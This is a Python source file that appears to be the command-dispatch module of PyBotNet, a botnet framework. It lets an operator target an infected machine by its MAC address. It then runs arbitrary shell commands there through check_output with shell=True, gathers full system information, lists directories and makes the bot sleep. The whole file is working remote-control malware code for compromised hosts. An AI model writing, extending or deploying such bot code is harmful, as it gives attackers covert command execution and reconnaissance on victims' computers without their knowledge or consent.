'''Defult PyBotNet scripts'''

from time import sleep
from subprocess import check_output
from os import listdir

from uuid import getnode as get_system_mac_addres


# pybotnet import
import util

mac_addres = str(get_system_mac_addres())

scripts_name = {
    mac_addres: 'system mac_addres',
    "do_sleep": 'do_sleep <scconds> <message>',
    "get_info": 'get_info',
    "cmd": 'cmd <command>',
    "ls": 'ls <route>'
}


def get_command_name(command) -> str:
    return split_command(command)[0]


def split_command(command) -> list:
    return command.split(' ')


def is_command(command) -> bool:
    command_name = get_command_name(command)
    if command_name in scripts_name:
        return True
    return False


def execute_scripts(command, pybotnet_up_time, logger):
    command_name = get_command_name(command)
    try:
        if is_command(command):

            if command_name == mac_addres:
                '''run command just in this system'''
                logger.info('delete mac addres and run command ')
                new_command = ' '.join(split_command(command)[1:])
                return execute_scripts(new_command, pybotnet_up_time, logger)

            elif command_name == 'do_sleep':
                return execute_do_sleep(command, logger)

            elif command_name == 'get_info':
                return get_info(pybotnet_up_time, logger)

            elif command_name == 'cmd':
                return execute_cmd(command, logger)

            elif command_name == 'ls':
                return execute_ls(command, logger)

        logger.error('invalid command; Wrong format')
        return 'invalid command; Wrong format'

    except:
        return 'execute_scripts error'


def execute_do_sleep(command, logger):
    command = split_command(command)
    try:
        sleep_message = command[2:]
        sleep_message = ' '.join(sleep_message)
    except:
        sleep_message = ''

    try:
        do_sleep(seconds=command[1], logger=logger,
                 sleep_message=sleep_message)
        logger.info('do_sleep done')
        return 'do_sleep done'
    except:
        logger.error('execute_do_sleep invalid command; Wrong format')
        return 'execute_do_sleep invalid command; Wrong format'


def do_sleep(seconds, logger, sleep_message: str):
    '''
    print sleep message and sleep
    '''
    if sleep_message != '':
        print(sleep_message)

    logger.info(f'sleep {seconds} second | {sleep_message}')
    sleep(float(seconds))
    logger.info('sleep done')


def get_info(pybotnet_up_time, logger):
    logger.info('return system info')
    return util.get_full_system_info(pybotnet_up_time)


def execute_cmd(command, logger) -> str:
    try:
        command = split_command(command)
        command = ' '.join(command[1:])

    except:
        return 'execute_cmd invalid command; Wrong format'

    try:
        return cmd(command, logger=logger)
    except:
        return 'cmd error'


def cmd(command: str,  logger) -> str:
    '''command sample: makedir newfolder'''
    # TODO: add timeout

    logger.info(f'try to run: {command}')

    output = check_output(command, shell=True)

    output = str(output).replace('\\r\\n', '\n')  # cleaning data
    output = output[2:]  # remove b'
    return output


def execute_ls(command, logger) -> str:
    command = split_command(command)

    logger.info(f'execute ls: {command}')

    try:
        return ls(command[1])
    except:
        return 'execute_ls error '


def ls(route: str) -> str:
    try:
        return listdir(route)

    except FileNotFoundError as error:
        return f'ls {error}'
    except:
        return 'ls Unknown error'
